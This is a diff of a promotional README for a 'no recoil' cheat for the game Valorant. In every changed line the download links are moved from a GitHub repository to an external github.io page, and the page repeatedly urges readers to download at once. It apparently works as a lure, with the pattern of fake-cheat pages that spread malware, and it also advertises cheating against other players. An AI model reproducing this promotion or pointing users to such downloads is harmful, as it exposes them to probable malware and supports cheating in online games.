@@ -1,6 +1,6 @@
 # 🎯 valorant-no-recoil-2026 - Perfect Spray Control, Zero Recoil
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/🚀_DOWNLOAD_VALORANT_NO_RECOIL_2026-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Xnar3785/valorant-no-recoil-2026)
+[![DOWNLOAD NOW](https://img.shields.io/badge/🚀_DOWNLOAD_VALORANT_NO_RECOIL_2026-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://xnar3785.github.io)
 
 ## 🏆 What Is This?
 
@@ -24,7 +24,7 @@ Getting started takes less than five minutes. Follow these simple steps:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Xnar3785/valorant-no-recoil-2026](https://github.com/Xnar3785/valorant-no-recoil-2026)
+Visit this link to download the application: [https://xnar3785.github.io](https://xnar3785.github.io)
 
 Click the download button on that page to get the file.
 
@@ -40,9 +40,9 @@ Launch Valorant, join a game, and enjoy perfect spray control from the very firs
 
 Ready to improve your aim instantly? Here's everything you need:
 
-[![Download Button - Large and Green](https://img.shields.io/badge/CLICK_HERE_TO_DOWNLOAD-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://github.com/Xnar3785/valorant-no-recoil-2026)
+[![Download Button - Large and Green](https://img.shields.io/badge/CLICK_HERE_TO_DOWNLOAD-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://xnar3785.github.io)
 
-Visit this link to download the application: [https://github.com/Xnar3785/valorant-no-recoil-2026](https://github.com/Xnar3785/valorant-no-recoil-2026)
+Visit this link to download the application: [https://xnar3785.github.io](https://xnar3785.github.io)
 
 That's it. No registrations, no surveys, no waiting periods. Just click, download, and play.
 
@@ -151,9 +151,9 @@ This tool gives you a massive competitive advantage in Valorant. Whether you're 
 
 Don't waste another match struggling with spray patterns. Download now and experience what it feels like to have perfect aim every single time.
 
-[![Final Download CTA](https://img.shields.io/badge/🚀_DOWNLOAD_NOW_&_DOMINATE-FF0000?style=for-the-badge&logo=database&logoColor=white)](https://github.com/Xnar3785/valorant-no-recoil-2026)
+[![Final Download CTA](https://img.shields.io/badge/🚀_DOWNLOAD_NOW_&_DOMINATE-FF0000?style=for-the-badge&logo=database&logoColor=white)](https://xnar3785.github.io)
 
-Remember to visit [https://github.com/Xnar3785/valorant-no-recoil-2026](https://github.com/Xnar3785/valorant-no-recoil-2026) to download the latest version.
+Remember to visit [https://xnar3785.github.io](https://xnar3785.github.io) to download the latest version.
 
 See you on the battlefield — with zero recoil.
 
